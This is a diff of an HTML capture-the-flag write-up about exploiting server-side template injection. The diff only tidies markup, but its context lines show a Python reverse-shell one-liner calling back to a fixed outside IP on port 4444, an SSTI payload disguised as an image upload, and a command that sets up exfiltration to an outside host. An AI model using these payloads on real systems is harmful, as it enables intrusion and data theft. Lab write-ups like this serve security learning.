@@ -183,6 +183,7 @@ A basic test to see if SSTI is possible is {{7*7}}. Because the application eval
 <p>
 Trial and error testing revealed the following filters and the obfuscations needed to bypass.
 <br>
+</p>
 <pre><code class="language-">
 ┌───────────────────────────────┐
 │ 1. Payload Construction        │
@@ -231,7 +232,7 @@ Trial and error testing revealed the following filters and the obfuscations need
 │   → Sandbox hardening present  │
 └───────────────────────────────┘
 </code></pre>
-<br>
+<p>
 A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".
 <br>
 </p>
@@ -262,20 +263,14 @@ The following payload was inserted into a file called payload.jpg and uploaded t
 <pre><code class="language-">
 #!/bin/sh
 export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.
 <br>
 </p>
 <pre><code class="language-">
 sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 <h2>Step Four: Exfilitrate Data leveraging an Insecure processes / Data Leakage</h2>
 <br>
@@ -315,10 +310,7 @@ The following command was issued in the shell as www-data to trigger the data ex
 </p>
 <pre><code class="language-">
 echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 The exfiltrated data file is located here: <a href="/HHC_2025/resources/shadow_exfil.png">Exfiltrated File</a>
 <br>
